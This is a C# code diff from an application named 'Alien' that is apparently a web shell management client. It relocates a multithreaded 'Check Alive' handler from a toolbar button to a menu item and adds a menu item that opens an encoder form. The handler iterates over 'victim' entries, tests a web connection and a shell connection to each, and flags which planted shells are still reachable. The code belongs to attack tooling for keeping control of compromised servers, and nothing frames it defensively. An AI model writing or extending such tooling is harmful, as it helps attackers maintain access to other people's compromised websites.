@@ -433,67 +433,6 @@ namespace Alien
             fnUpdateState();
         }
 
-        private async void toolStripButton1_Click(object sender, EventArgs e)
-        {
-            try
-            {
-                toolStripStatusLabel4.Text = "Loading...";
-
-                int nThread = int.Parse(Interaction.InputBox("Thread count:", "Check Alive", "3"));
-                if (nThread <= 0)
-                    throw new Exception("Invalid number.");
-
-                toolStripProgressBar1.Value = 0;
-                toolStripProgressBar1.Maximum = listView1.Items.Count;
-
-                Dictionary<clsWeb, ListViewItem> dic = new Dictionary<clsWeb, ListViewItem>();
-                foreach (ListViewItem item in listView1.Items)
-                    dic.Add(fnGetVictimTag(item), item);
-
-                var semaphore = new SemaphoreSlim(nThread);
-                List<Task> lsTask = new List<Task>();
-
-                bool bDoHttpGet = m_iniMgr.ReadBool("General", "DoHttpGet");
-
-                foreach (clsWeb web in dic.Keys)
-                {
-                    lsTask.Add(Task.Run(async () =>
-                    {
-                        await semaphore.WaitAsync();
-
-                        try
-                        {
-                            bool bAlive = true;
-                            if (bDoHttpGet)
-                                bAlive = await web.fnbTestWebConnection(false);
-
-                            bAlive = bAlive && await web.fnbTestShellConnection(false);
-
-                            Invoke(() => dic[web].ImageKey = bAlive ? "yes" : "no");
-                        }
-                        finally
-                        {
-                            semaphore.Release();
-
-                            Invoke(() => toolStripProgressBar1.Increment(1));
-                        }
-                    }));
-                }
-
-                await Task.WhenAll(lsTask);
-
-                MessageBox.Show("Completed, please check.", "Done", MessageBoxButtons.OK, MessageBoxIcon.Information);
-            }
-            catch (Exception ex)
-            {
-                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
-            }
-            finally
-            {
-                toolStripStatusLabel4.Text = "Tasks are finished";
-            }
-        }
-
         private void toolStripMenuItem7_Click(object sender, EventArgs e)
         {
             frmBuilder f = new frmBuilder(m_tamper);
@@ -582,6 +521,73 @@ namespace Alien
                     MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                 }
             }
+        }
+
+        private async void toolStripMenuItem10_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                toolStripStatusLabel4.Text = "Loading...";
+
+                int nThread = int.Parse(Interaction.InputBox("Thread count:", "Check Alive", "3"));
+                if (nThread <= 0)
+                    throw new Exception("Invalid number.");
+
+                toolStripProgressBar1.Value = 0;
+                toolStripProgressBar1.Maximum = listView1.Items.Count;
+
+                Dictionary<clsWeb, ListViewItem> dic = new Dictionary<clsWeb, ListViewItem>();
+                foreach (ListViewItem item in listView1.Items)
+                    dic.Add(fnGetVictimTag(item), item);
+
+                var semaphore = new SemaphoreSlim(nThread);
+                List<Task> lsTask = new List<Task>();
+
+                bool bDoHttpGet = m_iniMgr.ReadBool("General", "DoHttpGet");
+
+                foreach (clsWeb web in dic.Keys)
+                {
+                    lsTask.Add(Task.Run(async () =>
+                    {
+                        await semaphore.WaitAsync();
+
+                        try
+                        {
+                            bool bAlive = true;
+                            if (bDoHttpGet)
+                                bAlive = await web.fnbTestWebConnection(false);
+
+                            bAlive = bAlive && await web.fnbTestShellConnection(false);
+
+                            Invoke(() => dic[web].ImageKey = bAlive ? "yes" : "no");
+                        }
+                        finally
+                        {
+                            semaphore.Release();
+
+                            Invoke(() => toolStripProgressBar1.Increment(1));
+                        }
+                    }));
+                }
+
+                await Task.WhenAll(lsTask);
+
+                MessageBox.Show("Completed, please check.", "Done", MessageBoxButtons.OK, MessageBoxIcon.Information);
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+            finally
+            {
+                toolStripStatusLabel4.Text = "Tasks are finished";
+            }
+        }
+
+        private void toolStripMenuItem11_Click(object sender, EventArgs e)
+        {
+            frmEncoder f = new frmEncoder();
+            f.Show();
         }
     }
 
